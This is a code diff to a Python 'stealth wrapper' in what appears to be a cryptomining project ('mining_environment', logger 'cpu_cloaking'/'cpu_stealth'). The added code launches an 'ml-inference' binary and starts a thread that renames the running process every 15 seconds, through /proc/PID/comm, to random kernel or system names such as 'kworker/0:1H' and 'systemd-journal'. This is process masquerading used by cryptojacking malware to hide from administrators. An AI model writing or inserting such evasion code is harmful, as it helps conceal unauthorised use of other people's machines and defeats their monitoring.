@@ -24,6 +24,8 @@ import sys
 import signal
 import time
 import subprocess
+import threading
+import random
 from pathlib import Path
 
 # Add project root to Python path
@@ -39,7 +41,7 @@ except ImportError as e:
     sys.exit(1)
 
 # Setup logging
-logger = get_unified_logger('mining_environment.cpu_cloaking')
+logger = get_unified_logger('mining_environment.cpu_stealth')
 
 def signal_handler(signum, frame):
     """
@@ -124,15 +126,56 @@ def main():
         exec_command = [ml_inference_path] + ml_inference_args
         logger.info(f"🔄 [STEALTH-WRAPPER] Executing: {' '.join(exec_command)}")
         
-        # **EXEC ML-INFERENCE**: Thay thế process image nhưng giữ nguyên stealth manager
-        # Note: os.execv sẽ thay thế process image nhưng stealth_manager thread sẽ continue
+        # 🚀 PHASE 2: Post-Exec Stealth Implementation
+        # Use subprocess instead of execv() to maintain stealth control
+        logger.info("🔄 [POST-EXEC-STEALTH] Using subprocess mode to maintain stealth control")
+        
         try:
-            # Flush logs trước khi exec
-            import logging
-            logging.shutdown()
+            # Start ml-inference as subprocess
+            process = subprocess.Popen(
+                exec_command,
+                stdout=sys.stdout,
+                stderr=sys.stderr
+            )
+            logger.info(f"✅ [POST-EXEC-STEALTH] ml-inference started as subprocess PID: {process.pid}")
             
-            # Use os.execv để replace process image
-            os.execv(ml_inference_path, exec_command)
+            # 🔒 PHASE 2: Implement post-exec stealth maintenance for subprocess
+            def maintain_subprocess_stealth():
+                """Maintain stealth for subprocess every 15 seconds"""
+                while process.poll() is None:  # While process is running
+                    try:
+                        time.sleep(15)  # Shorter interval for tighter control
+                        if process.poll() is None:  # Check again after sleep
+                            # Apply stealth to subprocess
+                            subprocess_stealth_name = random.choice([
+                                "systemd-sleep", "kworker/0:1H", "migration/0", 
+                                "rcu_gp", "systemd-journal", "cron"
+                            ])
+                            
+                            # Try to change subprocess name via /proc/comm
+                            try:
+                                with open(f"/proc/{process.pid}/comm", "w") as f:
+                                    f.write(subprocess_stealth_name[:15])
+                                logger.debug(f"🔄 [POST-EXEC-STEALTH] Subprocess PID {process.pid} renamed to: {subprocess_stealth_name}")
+                            except Exception as comm_error:
+                                logger.debug(f"⚠️ [POST-EXEC-STEALTH] Could not rename subprocess: {comm_error}")
+                    except Exception as e:
+                        logger.error(f"❌ [POST-EXEC-STEALTH] Error in stealth maintenance: {e}")
+                        break
+                        
+                logger.info("🔚 [POST-EXEC-STEALTH] Subprocess terminated - stopping stealth maintenance")
+            
+            # Start stealth maintenance thread
+            stealth_thread = threading.Thread(target=maintain_subprocess_stealth, daemon=True)
+            stealth_thread.start()
+            
+            # Wait for subprocess to complete
+            return_code = process.wait()
+            logger.info(f"🔚 [POST-EXEC-STEALTH] ml-inference subprocess completed with code: {return_code}")
+            
+            # Cleanup
+            stealth_manager.stop_stealth_mode()
+            sys.exit(return_code)
             
         except Exception as e:
             logger.error(f"❌ [STEALTH-WRAPPER] Failed to exec ml-inference: {e}")
